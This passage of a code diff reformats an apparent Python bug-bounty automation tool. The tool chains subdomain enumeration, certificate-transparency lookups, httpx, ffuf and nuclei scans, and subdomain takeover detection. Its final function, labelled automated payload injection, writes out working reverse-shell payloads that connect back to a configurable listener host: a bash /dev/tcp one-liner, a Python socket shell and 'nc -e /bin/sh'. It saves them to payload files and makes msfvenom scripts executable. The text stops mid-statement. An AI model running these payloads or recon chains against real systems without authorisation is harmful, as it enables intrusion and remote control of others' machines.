dir_path.mkdir(exist_ok=True)\n             print(f\"    \u2514\u2500 Created {dir_path.name}\")\n \n+\n def create_tool_status_report():\n     \"\"\"Create a comprehensive tool status report\"\"\"\n     print(\"\\n\\033[93m\ud83d\udcca Creating Tool Status Report...\\033[0m\")\n \n     report_file = HERE / \"tool_status_report.json\"\n     status = EnhancedToolFallbackManager.get_tool_status()\n \n     # Add system information\n     import platform\n+\n     report_data = {\n         \"timestamp\": datetime.now().isoformat(),\n         \"system_info\": {\n             \"platform\": platform.system(),\n             \"version\": platform.version(),\n             \"architecture\": platform.architecture()[0],\n-            \"python_version\": platform.python_version()\n+            \"python_version\": platform.python_version(),\n         },\n         \"tool_status\": status,\n         \"summary\": {\n             \"total_tools\": len(status),\n             \"available_tools\": len([t for t in status.values() if t[\"available\"]]),\n             \"missing_tools\": len([t for t in status.values() if not t[\"available\"]]),\n-            \"installable_tools\": len([t for t in status.values() if t[\"installable\"]])\n-        }\n+            \"installable_tools\": len([t for t in status.values() if t[\"installable\"]]),\n+        },\n     }\n \n     try:\n-        with open(report_file, 'w') as f:\n+        with open(report_file, \"w\") as f:\n             json.dump(report_data, f, indent=2)\n \n         logger.log(f\"\u2705 Tool status report saved to: {report_file}\", \"SUCCESS\")\n \n         # Display summary\n@@ -9899,83 +12074,102 @@\n         print(f\"  Installable: {summary['installable_tools']}\")\n \n     except Exception as e:\n         logger.log(f\"Failed to create tool status report: {e}\", \"ERROR\")\n \n+\n # ---------- BCAR Integration Functions ----------\n def run_bcar_enhanced_reconnaissance(rd, env, cfg):\n     \"\"\"Run BCAR enhanced reconnaissance module\"\"\"\n     if not BCAR_AVAILABLE:\n-        logger.log(\"BCAR module not available. Please check bcar.py installation.\", \"WARNING\")\n+        logger.log(\n+            \"BCAR module not available. Please check bcar.py installation.\", \"WARNING\"\n+        )\n         return\n \n     logger.log(\"Starting BCAR Enhanced Reconnaissance...\", \"INFO\")\n \n     try:\n         # Initialize BCAR integration\n         bcar_integration = PantheonBCARIntegration()\n \n         # Get targets from run data\n         targets = []\n-        if hasattr(rd, 'targets_list') and rd.targets_list:\n+        if hasattr(rd, \"targets_list\") and rd.targets_list:\n             targets = rd.targets_list\n         else:\n             # Fallback to reading from targets file\n             if TARGETS.exists():\n-                with open(TARGETS, 'r') as f:\n+                with open(TARGETS, \"r\") as f:\n                     targets = [line.strip() for line in f if line.strip()]\n \n         if not targets:\n             logger.log(\"No targets found for BCAR scan\", \"ERROR\")\n             return\n \n         # Configure BCAR scan\n-        bcar_config = cfg.get('bcar', {\n-            'ct_search': True,\n-            'subdomain_enum': True,\n-            'takeover_check': True,\n-            'port_scan': True,\n-            'tech_detection': True,\n-            'directory_fuzz': True,\n-            'parameter_discovery': True\n-        })\n+        bcar_config = cfg.get(\n+            \"bcar\",\n+            {\n+                \"ct_search\": True,\n+                \"subdomain_enum\": True,\n+                \"takeover_check\": True,\n+                \"port_scan\": True,\n+                \"tech_detection\": True,\n+                \"directory_fuzz\": True,\n+                \"parameter_discovery\": True,\n+            },\n+        )\n \n         # Run BCAR scan\n         logger.log(f\"Running BCAR scan on {len(targets)} targets...\", \"INFO\")\n-        bcar_results = bcar_integration.integrate_with_pantheon_scan(targets, bcar_config)\n+        bcar_results = bcar_integration.integrate_with_pantheon_scan(\n+            targets, bcar_config\n+        )\n \n         # Save results\n         bcar_output_file = rd.run_dir / \"bcar_enhanced_results.json\"\n-        with open(bcar_output_file, 'w') as f:\n+        with open(bcar_output_file, \"w\") as f:\n             json.dump(bcar_results, f, indent=2)\n \n         logger.log(f\"BCAR results saved to: {bcar_output_file}\", \"SUCCESS\")\n \n         # Log summary\n         total_subdomains = 0\n         total_vulnerabilities = 0\n-        for domain, results in bcar_results['bcar_results'].items():\n-            total_subdomains += len(results.get('subdomains', []))\n-            total_vulnerabilities += len(results.get('takeover_vulnerabilities', []))\n-\n-        logger.log(f\"BCAR Summary: {total_subdomains} subdomains, {total_vulnerabilities} takeover vulnerabilities found\", \"INFO\")\n+        for domain, results in bcar_results[\"bcar_results\"].items():\n+            total_subdomains += len(results.get(\"subdomains\", []))\n+            total_vulnerabilities += len(results.get(\"takeover_vulnerabilities\", []))\n+\n+        logger.log(\n+            f\"BCAR Summary: {total_subdomains} subdomains, {total_vulnerabilities} takeover vulnerabilities found\",\n+            \"INFO\",\n+        )\n \n     except Exception as e:\n         logger.log(f\"BCAR reconnaissance failed: {e}\", \"ERROR\")\n \n+\n # ---------- Enhanced Bug Bounty Integration Functions ----------\n \n-def run_enhanced_bug_bounty_automation(rd: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n+\n+def run_enhanced_bug_bounty_automation(\n+    rd: Path, env: Dict[str, str], cfg: Dict[str, Any]\n+):\n     \"\"\"Enhanced bug bounty automation with integrated functionality from bug_bounty_commands.sh\"\"\"\n     logger.log(\"Starting Enhanced Bug Bounty Automation...\", \"INFO\")\n \n     try:\n         # Get targets\n         targets = []\n         if TARGETS.exists():\n-            with open(TARGETS, 'r') as f:\n-                targets = [line.strip() for line in f if line.strip() and validate_domain_input(line.strip())]\n+            with open(TARGETS, \"r\") as f:\n+                targets = [\n+                    line.strip()\n+                    for line in f\n+                    if line.strip() and validate_domain_input(line.strip())\n+                ]\n \n         if not targets:\n             logger.log(\"No valid targets found for bug bounty automation\", \"ERROR\")\n             return\n \n@@ -9986,40 +12180,50 @@\n             \"timestamp\": datetime.now().isoformat(),\n             \"targets_scanned\": len(targets),\n             \"total_subdomains\": 0,\n             \"total_vulnerabilities\": 0,\n             \"tools_used\": [],\n-            \"results\": {}\n+            \"results\": {},\n         }\n \n         for target in targets:\n             logger.log(f\"Processing target: {target}\", \"INFO\")\n             target_results = run_comprehensive_bug_bounty_scan(target, results_dir, cfg)\n             bug_bounty_summary[\"results\"][target] = target_results\n-            bug_bounty_summary[\"total_subdomains\"] += target_results.get(\"subdomains_found\", 0)\n-            bug_bounty_summary[\"total_vulnerabilities\"] += target_results.get(\"vulnerabilities_found\", 0)\n+            bug_bounty_summary[\"total_subdomains\"] += target_results.get(\n+                \"subdomains_found\", 0\n+            )\n+            bug_bounty_summary[\"total_vulnerabilities\"] += target_results.get(\n+                \"vulnerabilities_found\", 0\n+            )\n \n         # Save comprehensive results\n         summary_file = results_dir / \"bug_bounty_summary.json\"\n-        with open(summary_file, 'w') as f:\n+        with open(summary_file, \"w\") as f:\n             json.dump(bug_bounty_summary, f, indent=2)\n \n-        logger.log(f\"Bug bounty automation completed. Found {bug_bounty_summary['total_subdomains']} subdomains and {bug_bounty_summary['total_vulnerabilities']} potential vulnerabilities\", \"SUCCESS\")\n+        logger.log(\n+            f\"Bug bounty automation completed. Found {bug_bounty_summary['total_subdomains']} subdomains and {bug_bounty_summary['total_vulnerabilities']} potential vulnerabilities\",\n+            \"SUCCESS\",\n+        )\n \n     except Exception as e:\n         logger.log(f\"Bug bounty automation failed: {e}\", \"ERROR\")\n \n-def run_comprehensive_bug_bounty_scan(target: str, results_dir: Path, cfg: Dict[str, Any]) -> Dict[str, Any]:\n+\n+def run_comprehensive_bug_bounty_scan(\n+    target: str, results_dir: Path, cfg: Dict[str, Any]\n+) -> Dict[str, Any]:\n     \"\"\"Run comprehensive bug bounty scan for a single target\"\"\"\n     target_dir = results_dir / target\n     target_dir.mkdir(exist_ok=True)\n \n     scan_results = {\n         \"target\": target,\n         \"subdomains_found\": 0,\n         \"vulnerabilities_found\": 0,\n-        \"scan_phases\": {}\n+        \"scan_phases\": {},\n     }\n \n     # Phase 1: Enhanced Subdomain Enumeration\n     logger.log(f\"Phase 1: Enhanced subdomain enumeration for {target}\", \"INFO\")\n     subdomain_results = run_enhanced_subdomain_enumeration(target, target_dir, cfg)\n@@ -10027,11 +12231,13 @@\n     scan_results[\"subdomains_found\"] = len(subdomain_results.get(\"subdomains\", []))\n \n     # Phase 2: Port Scanning and Service Detection\n     if subdomain_results.get(\"subdomains\"):\n         logger.log(\"Phase 2: Port scanning and service detection\", \"INFO\")\n-        port_results = run_enhanced_port_scanning(subdomain_results[\"subdomains\"], target_dir, cfg)\n+        port_results = run_enhanced_port_scanning(\n+            subdomain_results[\"subdomains\"], target_dir, cfg\n+        )\n         scan_results[\"scan_phases\"][\"port_scanning\"] = port_results\n \n     # Phase 3: Web Application Discovery\n     logger.log(\"Phase 3: Web application discovery\", \"INFO\")\n     webapp_results = run_enhanced_web_discovery(target, target_dir, cfg)\n@@ -10043,50 +12249,65 @@\n     scan_results[\"scan_phases\"][\"vulnerability_assessment\"] = vuln_results\n     scan_results[\"vulnerabilities_found\"] = len(vuln_results.get(\"vulnerabilities\", []))\n \n     return scan_results\n \n-def run_enhanced_subdomain_enumeration(target: str, target_dir: Path, cfg: Dict[str, Any]) -> Dict[str, Any]:\n+\n+def run_enhanced_subdomain_enumeration(\n+    target: str, target_dir: Path, cfg: Dict[str, Any]\n+) -> Dict[str, Any]:\n     \"\"\"Enhanced subdomain enumeration using multiple tools and techniques\"\"\"\n-    subdomain_results = {\n-        \"subdomains\": set(),\n-        \"tools_used\": [],\n-        \"errors\": []\n-    }\n+    subdomain_results = {\"subdomains\": set(), \"tools_used\": [], \"errors\": []}\n \n     # Tool configurations with fallbacks\n     tools_config = [\n-        {\"name\": \"subfinder\", \"cmd\": [\"subfinder\", \"-d\", target, \"-all\", \"-silent\"], \"timeout\": 300},\n-        {\"name\": \"assetfinder\", \"cmd\": [\"assetfinder\", \"--subs-only\", target], \"timeout\": 180},\n+        {\n+            \"name\": \"subfinder\",\n+            \"cmd\": [\"subfinder\", \"-d\", target, \"-all\", \"-silent\"],\n+            \"timeout\": 300,\n+        },\n+        {\n+            \"name\": \"assetfinder\",\n+            \"cmd\": [\"assetfinder\", \"--subs-only\", target],\n+            \"timeout\": 180,\n+        },\n         {\"name\": \"findomain\", \"cmd\": [\"findomain\", \"-t\", target, \"-q\"], \"timeout\": 240},\n     ]\n \n     # Use amass if available (longer timeout due to comprehensiveness)\n     if which(\"amass\"):\n-        tools_config.append({\n-            \"name\": \"amass\",\n-            \"cmd\": [\"amass\", \"enum\", \"-passive\", \"-d\", target],\n-            \"timeout\": 600\n-        })\n+        tools_config.append(\n+            {\n+                \"name\": \"amass\",\n+                \"cmd\": [\"amass\", \"enum\", \"-passive\", \"-d\", target],\n+                \"timeout\": 600,\n+            }\n+        )\n \n     for tool_config in tools_config:\n         tool_name = tool_config[\"name\"]\n         if which(tool_name):\n             try:\n                 logger.log(f\"Running {tool_name} for subdomain enumeration\", \"DEBUG\")\n                 result = run_cmd(\n                     tool_config[\"cmd\"],\n                     timeout=tool_config[\"timeout\"],\n                     capture=True,\n-                    check_return=False\n+                    check_return=False,\n                 )\n \n                 if result and result.stdout:\n-                    new_subdomains = set(line.strip() for line in result.stdout.splitlines() if line.strip())\n+                    new_subdomains = set(\n+                        line.strip()\n+                        for line in result.stdout.splitlines()\n+                        if line.strip()\n+                    )\n                     subdomain_results[\"subdomains\"].update(new_subdomains)\n                     subdomain_results[\"tools_used\"].append(tool_name)\n-                    logger.log(f\"{tool_name} found {len(new_subdomains)} subdomains\", \"DEBUG\")\n+                    logger.log(\n+                        f\"{tool_name} found {len(new_subdomains)} subdomains\", \"DEBUG\"\n+                    )\n \n             except Exception as e:\n                 error_msg = f\"{tool_name} failed: {str(e)}\"\n                 subdomain_results[\"errors\"].append(error_msg)\n                 logger.log(error_msg, \"WARNING\")\n@@ -10095,29 +12316,34 @@\n     try:\n         ct_subdomains = search_certificate_transparency(target)\n         if ct_subdomains:\n             subdomain_results[\"subdomains\"].update(ct_subdomains)\n             subdomain_results[\"tools_used\"].append(\"certificate_transparency\")\n-            logger.log(f\"Certificate transparency found {len(ct_subdomains)} subdomains\", \"DEBUG\")\n+            logger.log(\n+                f\"Certificate transparency found {len(ct_subdomains)} subdomains\",\n+                \"DEBUG\",\n+            )\n     except Exception as e:\n         subdomain_results[\"errors\"].append(f\"Certificate transparency failed: {str(e)}\")\n \n     # Convert set to list for JSON serialization\n     subdomain_results[\"subdomains\"] = sorted(list(subdomain_results[\"subdomains\"]))\n \n     # Save subdomains to file\n     subdomain_file = target_dir / f\"{target}_subdomains.txt\"\n-    with open(subdomain_file, 'w') as f:\n-        f.write('\\n'.join(subdomain_results[\"subdomains\"]))\n+    with open(subdomain_file, \"w\") as f:\n+        f.write(\"\\n\".join(subdomain_results[\"subdomains\"]))\n \n     return subdomain_results\n+\n \n def search_certificate_transparency(domain: str) -> List[str]:\n     \"\"\"Search Certificate Transparency logs for subdomains with performance optimization\"\"\"\n     try:\n         # Try to use optimized version if available\n         from performance_optimizer import optimize_certificate_transparency_search\n+\n         result = optimize_certificate_transparency_search(f\"%25.{domain}\", limit=100)\n         if result:\n             return result\n     except ImportError:\n         # Fallback to original implementation\n@@ -10126,26 +12352,25 @@\n         # Log the error but continue with fallback\n         print(f\"Certificate transparency search failed: {e}\")\n \n     subdomains = set()\n \n-    ct_urls = [\n-        f\"https://crt.sh/?q=%25.{domain}&output=json\"\n-    ]\n+    ct_urls = [f\"https://crt.sh/?q=%25.{domain}&output=json\"]\n \n     for url in ct_urls:\n         try:\n             import requests\n+\n             response = requests.get(url, timeout=15)  # Increased timeout\n             if response.status_code == 200:\n                 data = response.json()\n                 # Limit results for performance\n                 for entry in data[:100]:  # Reduced from 1000 to 100\n-                    name_value = entry.get('name_value', '')\n-                    for name in name_value.split('\\n'):\n+                    name_value = entry.get(\"name_value\", \"\")\n+                    for name in name_value.split(\"\\n\"):\n                         name = name.strip().lower()\n-                        if name and domain in name and not name.startswith('*'):\n+                        if name and domain in name and not name.startswith(\"*\"):\n                             subdomains.add(name)\n                         if len(subdomains) >= 100:  # Cap at 100 results\n                             break\n                     if len(subdomains) >= 100:\n                         break\n@@ -10153,44 +12378,58 @@\n             print(f\"Certificate transparency search failed for {url}: {e}\")\n             continue\n \n     return list(subdomains)\n \n-def run_enhanced_port_scanning(subdomains: List[str], target_dir: Path, cfg: Dict[str, Any]) -> Dict[str, Any]:\n+\n+def run_enhanced_port_scanning(\n+    subdomains: List[str], target_dir: Path, cfg: Dict[str, Any]\n+) -> Dict[str, Any]:\n     \"\"\"Enhanced port scanning and service detection\"\"\"\n     port_results = {\n         \"live_hosts\": [],\n         \"services_found\": {},\n         \"tools_used\": [],\n-        \"errors\": []\n+        \"errors\": [],\n     }\n \n     # First, check which hosts are live\n     live_hosts = []\n     if which(\"httpx\"):\n         try:\n             # Create temporary file with subdomains\n             subdomains_file = target_dir / \"temp_subdomains.txt\"\n-            with open(subdomains_file, 'w') as f:\n-                f.write('\\n'.join(subdomains))\n+            with open(subdomains_file, \"w\") as f:\n+                f.write(\"\\n\".join(subdomains))\n \n             # Use httpx to find live hosts\n-            result = run_cmd([\n-                \"httpx\", \"-l\", str(subdomains_file), \"-silent\", \"-status-code\",\n-                \"-tech-detect\", \"-title\", \"-json\"\n-            ], timeout=600, capture=True, check_return=False)\n+            result = run_cmd(\n+                [\n+                    \"httpx\",\n+                    \"-l\",\n+                    str(subdomains_file),\n+                    \"-silent\",\n+                    \"-status-code\",\n+                    \"-tech-detect\",\n+                    \"-title\",\n+                    \"-json\",\n+                ],\n+                timeout=600,\n+                capture=True,\n+                check_return=False,\n+            )\n \n             if result and result.stdout:\n                 for line in result.stdout.splitlines():\n                     try:\n                         host_data = json.loads(line)\n                         if host_data.get(\"status-code\"):\n                             live_hosts.append(host_data[\"url\"])\n                             port_results[\"services_found\"][host_data[\"url\"]] = {\n                                 \"status_code\": host_data.get(\"status-code\"),\n                                 \"title\": host_data.get(\"title\", \"\"),\n-                                \"tech\": host_data.get(\"tech\", [])\n+                                \"tech\": host_data.get(\"tech\", []),\n                             }\n                     except json.JSONDecodeError:\n                         continue\n \n             port_results[\"tools_used\"].append(\"httpx\")\n@@ -10200,35 +12439,59 @@\n             port_results[\"errors\"].append(f\"httpx failed: {str(e)}\")\n \n     port_results[\"live_hosts\"] = live_hosts\n     return port_results\n \n-def run_enhanced_web_discovery(target: str, target_dir: Path, cfg: Dict[str, Any]) -> Dict[str, Any]:\n+\n+def run_enhanced_web_discovery(\n+    target: str, target_dir: Path, cfg: Dict[str, Any]\n+) -> Dict[str, Any]:\n     \"\"\"Enhanced web application discovery and crawling\"\"\"\n     web_results = {\n         \"endpoints\": [],\n         \"parameters\": [],\n         \"technologies\": [],\n         \"tools_used\": [],\n-        \"errors\": []\n+        \"errors\": [],\n     }\n \n     # Directory and file discovery\n     if which(\"ffu\"):\n         try:\n             # Use local wordlist or create a basic one\n             wordlist_file = EXTRA_DIR / \"paths_extra.txt\"\n             if not wordlist_file.exists():\n-                basic_paths = [\"admin\", \"api\", \"backup\", \"config\", \"login\", \"test\", \"upload\"]\n+                basic_paths = [\n+                    \"admin\",\n+                    \"api\",\n+                    \"backup\",\n+                    \"config\",\n+                    \"login\",\n+                    \"test\",\n+                    \"upload\",\n+                ]\n                 wordlist_file.parent.mkdir(exist_ok=True)\n-                with open(wordlist_file, 'w') as f:\n-                    f.write('\\n'.join(basic_paths))\n-\n-            result = run_cmd([\n-                \"ffu\", \"-u\", f\"http://{target}/FUZZ\", \"-w\", str(wordlist_file),\n-                \"-mc\", \"200,204,301,302,307,401,403\", \"-fs\", \"0\", \"-s\"\n-            ], timeout=300, capture=True, check_return=False)\n+                with open(wordlist_file, \"w\") as f:\n+                    f.write(\"\\n\".join(basic_paths))\n+\n+            result = run_cmd(\n+                [\n+                    \"ffu\",\n+                    \"-u\",\n+                    f\"http://{target}/FUZZ\",\n+                    \"-w\",\n+                    str(wordlist_file),\n+                    \"-mc\",\n+                    \"200,204,301,302,307,401,403\",\n+                    \"-fs\",\n+                    \"0\",\n+                    \"-s\",\n+                ],\n+                timeout=300,\n+                capture=True,\n+                check_return=False,\n+            )\n \n             if result and result.stdout:\n                 endpoints = []\n                 for line in result.stdout.splitlines():\n                     if \"Status:\" in line:\n@@ -10239,47 +12502,59 @@\n         except Exception as e:\n             web_results[\"errors\"].append(f\"ffuf failed: {str(e)}\")\n \n     return web_results\n \n-def run_enhanced_vulnerability_assessment(target: str, target_dir: Path, cfg: Dict[str, Any]) -> Dict[str, Any]:\n+\n+def run_enhanced_vulnerability_assessment(\n+    target: str, target_dir: Path, cfg: Dict[str, Any]\n+) -> Dict[str, Any]:\n     \"\"\"Enhanced vulnerability assessment using multiple scanners\"\"\"\n-    vuln_results = {\n-        \"vulnerabilities\": [],\n-        \"tools_used\": [],\n-        \"errors\": []\n-    }\n+    vuln_results = {\"vulnerabilities\": [], \"tools_used\": [], \"errors\": []}\n \n     # Nuclei scanning if available\n     if which(\"nuclei\"):\n         try:\n-            result = run_cmd([\n-                \"nuclei\", \"-u\", f\"http://{target}\", \"-severity\", \"info,low,medium,high,critical\",\n-                \"-jsonl\", \"-silent\"\n-            ], timeout=600, capture=True, check_return=False)\n+            result = run_cmd(\n+                [\n+                    \"nuclei\",\n+                    \"-u\",\n+                    f\"http://{target}\",\n+                    \"-severity\",\n+                    \"info,low,medium,high,critical\",\n+                    \"-jsonl\",\n+                    \"-silent\",\n+                ],\n+                timeout=600,\n+                capture=True,\n+                check_return=False,\n+            )\n \n             if result and result.stdout:\n                 vulnerabilities = []\n                 for line in result.stdout.splitlines():\n                     try:\n                         vuln_data = json.loads(line)\n-                        vulnerabilities.append({\n-                            \"template_id\": vuln_data.get(\"template-id\"),\n-                            \"severity\": vuln_data.get(\"info\", {}).get(\"severity\"),\n-                            \"name\": vuln_data.get(\"info\", {}).get(\"name\"),\n-                            \"url\": vuln_data.get(\"matched-at\")\n-                        })\n+                        vulnerabilities.append(\n+                            {\n+                                \"template_id\": vuln_data.get(\"template-id\"),\n+                                \"severity\": vuln_data.get(\"info\", {}).get(\"severity\"),\n+                                \"name\": vuln_data.get(\"info\", {}).get(\"name\"),\n+                                \"url\": vuln_data.get(\"matched-at\"),\n+                            }\n+                        )\n                     except json.JSONDecodeError:\n                         continue\n \n                 vuln_results[\"vulnerabilities\"] = vulnerabilities\n                 vuln_results[\"tools_used\"].append(\"nuclei\")\n \n         except Exception as e:\n             vuln_results[\"errors\"].append(f\"nuclei failed: {str(e)}\")\n \n     return vuln_results\n+\n \n def auto_fix_missing_dependencies():\n     \"\"\"Automatically fix missing dependencies and wordlists\"\"\"\n     try:\n         # Ensure essential directories exist\n@@ -10287,36 +12562,72 @@\n         for dir_path in essential_dirs:\n             dir_path.mkdir(exist_ok=True)\n \n         # Create missing wordlists\n         wordlists_to_create = {\n-            EXTRA_DIR / \"common_directories.txt\": [\n-                \"admin\", \"api\", \"app\", \"backup\", \"config\", \"data\", \"debug\",\n-                \"dev\", \"docs\", \"files\", \"images\", \"login\", \"test\", \"upload\"\n+            EXTRA_DIR\n+            / \"common_directories.txt\": [\n+                \"admin\",\n+                \"api\",\n+                \"app\",\n+                \"backup\",\n+                \"config\",\n+                \"data\",\n+                \"debug\",\n+                \"dev\",\n+                \"docs\",\n+                \"files\",\n+                \"images\",\n+                \"login\",\n+                \"test\",\n+                \"upload\",\n             ],\n-            EXTRA_DIR / \"common_parameters.txt\": [\n-                \"id\", \"user\", \"password\", \"token\", \"key\", \"file\", \"path\",\n-                \"url\", \"redirect\", \"callback\", \"search\", \"query\"\n+            EXTRA_DIR\n+            / \"common_parameters.txt\": [\n+                \"id\",\n+                \"user\",\n+                \"password\",\n+                \"token\",\n+                \"key\",\n+                \"file\",\n+                \"path\",\n+                \"url\",\n+                \"redirect\",\n+                \"callback\",\n+                \"search\",\n+                \"query\",\n             ],\n-            EXTRA_DIR / \"common_subdomains.txt\": [\n-                \"www\", \"mail\", \"api\", \"admin\", \"dev\", \"test\", \"staging\",\n-                \"blog\", \"app\", \"secure\", \"portal\", \"dashboard\"\n-            ]\n+            EXTRA_DIR\n+            / \"common_subdomains.txt\": [\n+                \"www\",\n+                \"mail\",\n+                \"api\",\n+                \"admin\",\n+                \"dev\",\n+                \"test\",\n+                \"staging\",\n+                \"blog\",\n+                \"app\",\n+                \"secure\",\n+                \"portal\",\n+                \"dashboard\",\n+            ],\n         }\n \n         for wordlist_path, words in wordlists_to_create.items():\n             if not wordlist_path.exists():\n-                with open(wordlist_path, 'w') as f:\n-                    f.write('\\n'.join(words))\n+                with open(wordlist_path, \"w\") as f:\n+                    f.write(\"\\n\".join(words))\n                 logger.log(f\"Created missing wordlist: {wordlist_path.name}\", \"INFO\")\n \n         logger.log(\"Dependencies auto-fix completed\", \"SUCCESS\")\n         return True\n \n     except Exception as e:\n         logger.log(f\"Auto-fix failed: {e}\", \"ERROR\")\n         return False\n+\n \n def run_advanced_subdomain_takeover(rd, env, cfg):\n     \"\"\"Run advanced subdomain takeover detection and exploitation\"\"\"\n     if not BCAR_AVAILABLE:\n         logger.log(\"BCAR module required for subdomain takeover detection\", \"WARNING\")\n@@ -10331,160 +12642,202 @@\n         subdomains = []\n \n         # Try to load from BCAR results first\n         bcar_results_file = rd.run_dir / \"bcar_enhanced_results.json\"\n         if bcar_results_file.exists():\n-            with open(bcar_results_file, 'r') as f:\n+            with open(bcar_results_file, \"r\") as f:\n                 bcar_data = json.load(f)\n-                for domain_results in bcar_data['bcar_results'].values():\n-                    subdomains.extend(domain_results.get('subdomains', []))\n+                for domain_results in bcar_data[\"bcar_results\"].values():\n+                    subdomains.extend(domain_results.get(\"subdomains\", []))\n \n         # Fallback to other subdomain discovery results\n         if not subdomains:\n             subdomain_files = list(rd.run_dir.glob(\"*subdomain*\"))\n             for file in subdomain_files:\n                 try:\n-                    if file.suffix == '.json':\n-                        with open(file, 'r') as f:\n+                    if file.suffix == \".json\":\n+                        with open(file, \"r\") as f:\n                             data = json.load(f)\n                             if isinstance(data, list):\n                                 subdomains.extend(data)\n                     else:\n-                        with open(file, 'r') as f:\n-                            subdomains.extend([line.strip() for line in f if line.strip()])\n+                        with open(file, \"r\") as f:\n+                            subdomains.extend(\n+                                [line.strip() for line in f if line.strip()]\n+                            )\n                 except Exception:\n                     continue\n \n         if not subdomains:\n             logger.log(\"No subdomains found for takeover testing\", \"ERROR\")\n             return\n \n         subdomains = list(set(subdomains))  # Remove duplicates\n-        logger.log(f\"Testing {len(subdomains)} subdomains for takeover vulnerabilities...\", \"INFO\")\n+        logger.log(\n+            f\"Testing {len(subdomains)} subdomains for takeover vulnerabilities...\",\n+            \"INFO\",\n+        )\n \n         # Run takeover detection\n         vulnerabilities = bcar.subdomain_takeover_check(subdomains)\n \n         # Save results\n         takeover_file = rd.run_dir / \"subdomain_takeover_results.json\"\n-        with open(takeover_file, 'w') as f:\n-            json.dump({\n-                'timestamp': datetime.now().isoformat(),\n-                'tested_subdomains': len(subdomains),\n-                'vulnerabilities': vulnerabilities\n-            }, f, indent=2)\n+        with open(takeover_file, \"w\") as f:\n+            json.dump(\n+                {\n+                    \"timestamp\": datetime.now().isoformat(),\n+                    \"tested_subdomains\": len(subdomains),\n+                    \"vulnerabilities\": vulnerabilities,\n+                },\n+                f,\n+                indent=2,\n+            )\n \n         logger.log(f\"Subdomain takeover results saved to: {takeover_file}\", \"SUCCESS\")\n \n         if vulnerabilities:\n-            logger.log(f\"Found {len(vulnerabilities)} potential subdomain takeover vulnerabilities!\", \"WARNING\")\n+            logger.log(\n+                f\"Found {len(vulnerabilities)} potential subdomain takeover vulnerabilities!\",\n+                \"WARNING\",\n+            )\n             for vuln in vulnerabilities:\n-                logger.log(f\"  - {vuln['subdomain']} ({vuln['service']}) - {vuln['confidence']} confidence\", \"WARNING\")\n+                logger.log(\n+                    f\"  - {vuln['subdomain']} ({vuln['service']}) - {vuln['confidence']} confidence\",\n+                    \"WARNING\",\n+                )\n         else:\n             logger.log(\"No subdomain takeover vulnerabilities detected\", \"INFO\")\n \n     except Exception as e:\n         logger.log(f\"Subdomain takeover detection failed: {e}\", \"ERROR\")\n+\n \n def run_automated_payload_injection(rd, env, cfg):\n     \"\"\"Run automated payload injection with reverse shell capabilities\"\"\"\n     logger.log(\"Starting Automated Payload Injection...\", \"INFO\")\n \n     try:\n         # Get configuration\n-        payload_config = cfg.get('payload_injection', {\n-            'lhost': cfg.get('payload', {}).get('lhost', '127.0.0.1'),\n-            'lport': cfg.get('payload', {}).get('lport', 4444),\n-            'test_mode': cfg.get('payload', {}).get('test_mode', True)\n-        })\n-\n-        lhost = payload_config['lhost']\n-        lport = int(payload_config['lport'])\n-        test_mode = payload_config['test_mode']\n+        payload_config = cfg.get(\n+            \"payload_injection\",\n+            {\n+                \"lhost\": cfg.get(\"payload\", {}).get(\"lhost\", \"127.0.0.1\"),\n+                \"lport\": cfg.get(\"payload\", {}).get(\"lport\", 4444),\n+                \"test_mode\": cfg.get(\"payload\", {}).get(\"test_mode\", True),\n+            },\n+        )\n+\n+        lhost = payload_config[\"lhost\"]\n+        lport = int(payload_config[\"lport\"])\n+        test_mode = payload_config[\"test_mode\"]\n \n         # Initialize payload generation\n         if BCAR_AVAILABLE:\n             bcar_integration = PantheonBCARIntegration()\n             payloads = bcar_integration.generate_meterpreter_payloads(lhost, lport)\n         else:\n             # Fallback payload generation\n             payloads = {\n-                'bash_reverse': f\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\",\n-                'python_reverse': \"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{lhost}\\\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\",\n-                'nc_reverse': f\"nc -e /bin/sh {lhost} {lport}\"\n+                \"bash_reverse\": f\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\",\n+                \"python_reverse\": 'python -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\\'',\n+                \"nc_reverse\": f\"nc -e /bin/sh {lhost} {lport}\",\n             }\n \n         # Save payloads to file\n         payloads_file = rd.run_dir / \"generated_payloads.json\"\n-        with open(payloads_file, 'w') as f:\n-            json.dump({\n-                'timestamp': datetime.now().isoformat(),\n-                'configuration': {'lhost': lhost, 'lport': lport, 'test_mode': test_mode},\n-                'payloads': payloads\n-            }, f, indent=2)\n-\n-        logger.log(f\"Generated {len(payloads)} payloads saved to: {payloads_file}\", \"SUCCESS\")\n+        with open(payloads_file, \"w\") as f:\n+            json.dump(\n+                {\n+                    \"timestamp\": datetime.now().isoformat(),\n+                    \"configuration\": {\n+                        \"lhost\": lhost,\n+                        \"lport\": lport,\n+                        \"test_mode\": test_mode,\n+                    },\n+                    \"payloads\": payloads,\n+                },\n+                f,\n+                indent=2,\n+            )\n+\n+        logger.log(\n+            f\"Generated {len(payloads)} payloads saved to: {payloads_file}\", \"SUCCESS\"\n+        )\n \n         # Generate payload files in payloads directory\n         payload_scripts_dir = PAYLOADS_DIR / f\"run_{rd.run_name}\"\n         payload_scripts_dir.mkdir(exist_ok=True)\n \n         # Create individual payload files\n         for payload_name, payload_content in payloads.items():\n-            if payload_name.startswith('msfvenom'):\n+            if payload_name.startswith(\"msfvenom\"):\n                 # Save msfvenom commands\n                 script_file = payload_scripts_dir / f\"{payload_name}.sh\"\n-                with open(script_file, 'w') as f:\n+                with open(script_file, \"w\") as f:\n                     f.write(f\"#!/bin/bash\\n# {payload_name}\\n{payload_content}\\n\")\n                 script_file.chmod(0o755)\n             else:\n                 # Save direct payloads\n                 payload_file = payload_scripts_dir / f\"{payload_name}.txt\"\n-                with open(payload_file, 'w') as f:\n+                with open(payload_file, \"w\") as f:\n                     f.write(payload_content)\n \n         logger.log(f\"Payload scripts saved to: {payload_scripts_dir}\", 